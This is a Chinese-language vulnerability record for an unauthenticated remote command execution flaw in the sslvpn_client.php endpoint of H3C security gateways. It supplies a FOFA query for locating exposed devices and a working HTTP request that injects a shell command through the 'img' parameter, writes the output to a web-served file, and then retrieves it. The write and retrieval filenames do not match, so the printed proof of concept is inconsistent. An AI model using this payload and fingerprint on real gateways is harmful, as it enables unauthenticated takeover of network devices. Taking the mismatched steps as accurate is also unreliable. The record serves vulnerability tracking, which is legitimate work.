---
schema_version: "1"
id: "VW-20261013-CG053"
title: "新华三H3C网关 sslvpn_client.php 命令执行"
product: "新华三H3C网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "source-claimed"
content_status: "active"
prerequisites: "新华三 H3C 安全网关/SSL VPN；无需认证"
side_effects: "命令注入可致 RCE；测试须限定授权环境"
source: "北雪网络安全；wxvl"
source_status: "recorded"
source_url: "https://pc.fenchuan8.com/#/index?forum=110296"
---

# 新华三H3C网关 sslvpn_client.php 命令执行

## 漏洞描述

新华三 H3C 安全网关/SSL VPN 的 `sslvpn_client.php` 存在远程命令执行漏洞。`img` 参数未过滤直接拼进 shell 命令，未授权攻击者可注入命令执行，写文件后通过 `/sslvpn/` 路径取回显。

FOFA：`body="/webui/images/default/default/alert_close.jpg"`

## 影响版本

- 受影响：新华三 H3C 安全网关/SSL VPN
- 修复版本：升级至安全版本

## 漏洞复现

```
GET /sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp%7Cecho%20%60id%60%20%7Ctee%20/usr/local/webui/sslvpn/859042264.txt HTTP/1.1
Host: 127.0.0.1

# 取回显
GET /sslvpn/85904226114.txt HTTP/1.1
```

## 漏洞修复

关闭互联网暴露面；升级至安全版本。

## 参考

- 北雪网络安全（2026-10-06）

> 仅限授权测试。
